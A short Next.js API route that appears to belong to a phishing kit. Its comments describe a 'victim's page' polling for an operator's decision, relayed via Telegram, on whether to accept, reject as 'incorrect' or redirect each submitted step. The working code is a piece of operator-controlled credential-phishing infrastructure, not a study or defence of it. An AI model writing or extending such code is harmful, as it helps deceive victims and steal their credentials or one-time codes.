import { NextRequest, NextResponse } from "next/server"
import { approvalView } from "@/lib/approval-gate"

export const dynamic = "force-dynamic"

/**
 * The approval polling "hook". The victim's page calls this (with the token
 * from the step submit) until The All Father approves / declines / redirects
 * from Telegram. Returns:
 *   { status: "pending" }                              → keep waiting
 *   { status: "decided", decision: "approve" }         → advance to next page
 *   { status: "decided", decision: "decline" }         → show "incorrect"
 *   { status: "decided", decision: "redirect" }        → redirect to target
 *   { status: "expired" }                              → give up (no decision)
 */
export async function GET(request: NextRequest) {
  const token = (request.nextUrl.searchParams.get("token") || "").trim()
  if (!token) {
    return NextResponse.json({ status: "expired" }, { status: 400 })
  }
  return NextResponse.json(await approvalView(token))
}
